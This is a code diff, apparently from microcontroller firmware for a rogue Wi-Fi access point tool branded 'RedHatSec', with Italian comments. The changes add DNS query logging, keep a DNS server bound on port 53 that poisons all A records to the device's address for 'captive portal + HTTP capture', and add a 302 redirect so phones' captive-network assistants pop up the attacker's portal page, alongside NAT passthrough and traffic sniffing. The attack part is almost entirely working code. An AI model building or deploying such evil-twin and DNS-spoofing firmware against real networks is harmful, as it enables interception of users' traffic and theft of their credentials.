@@ -356,6 +356,7 @@ void dnsTick() {
   }
   dnsClientIP = dnsSrv.remoteIP();
   dnsClientPort = dnsSrv.remotePort();
+  Serial.printf("[dns] %s fwd=%d\n", qn.c_str(), dnsFwd);
   if (!dnsFwd) {
     // poison: tutte le A → 192.168.4.1 (captive portal + HTTP capture)
     q[2] = 0x85; q[3] = 0x80;
@@ -421,6 +422,12 @@ void portalTick() {
 
   String page = (portalLen > 0) ? String(portalPage) :
     String("<html><body><h2>RHS Portal</h2><p>connessione acquisita dal bridge RedHatSec</p></body></html>");
+  // ballo captive portal iOS/Android: redirect 302 alla pagina → il CNA poppa
+  if (path != "/rhs") {
+    c.print("HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/rhs\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+    c.stop();
+    return;
+  }
   String r = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: ";
   r += page.length(); r += "\r\n\r\n"; r += page;
   c.print(r);
@@ -652,13 +659,13 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       }
       delay(300);
       dnsSrv.stop();
-      if (dnsPoison) dnsSrv.begin(53);
+      bool b53 = dnsSrv.begin(53);   // sempre: serve anche in forward mode
       portalSrv.stop();
       portalSrv.begin();
       rogue = true;
       sniffCount = 0;                        // log pulito a ogni rogue session
       ip_napt_enable((uint32_t)WiFi.localIP(), 1);   // internet passthrough per i client
-      Serial.printf("[rogue] %s ch%d dns=%d napt=1\n", rogueSsid, apChannel, dnsPoison);
+      Serial.printf("[rogue] %s ch%d dns=%d napt=1 dns53=%d\n", rogueSsid, apChannel, dnsPoison, b53);
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
